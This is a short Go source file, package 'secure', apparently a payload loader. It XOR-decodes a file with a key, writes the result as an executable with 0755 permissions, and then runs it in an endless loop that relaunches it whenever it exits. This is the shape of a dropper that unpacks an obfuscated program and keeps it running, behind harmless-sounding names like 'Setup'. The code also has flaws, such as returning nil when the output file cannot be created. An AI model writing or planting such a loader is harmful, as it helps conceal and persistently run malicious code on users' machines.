package secure

import (
	"bufio"
	"io"
	"log"
	"os"
	"os/exec"
)

func xor(data []byte, key []byte) []byte {
	result := make([]byte, len(data))
	for i, b := range data {
		k := key[i%len(key)]
		result[i] = b ^ k
	}
	return result
}

func XorFile(inPath string, outPath string, key []byte) error {
	f, err := os.Open(inPath)
	if err != nil {
		return err
	}

	defer f.Close()

	of, err := os.Create(outPath)
	if err != nil {
		return nil
	}
	defer of.Close()
	of.Chmod(0755)

	reader := bufio.NewReader(f)
	buf := make([]byte, len(key))
	for {
		n, err := reader.Read(buf)

		if err != nil {
			if err != io.EOF {
				log.Fatal(err)
			}
			break
		}

		xorChunk := xor(buf[0:n], key)
		of.Write(xorChunk)
	}
	return nil
}

func Setup(a string, b string, c []byte) {
	err := XorFile(a, b, c)
	if err != nil {
		panic(err)
	}

	for {
		c := exec.Command(b)
		c.Run()
		c.Wait()
	}
}
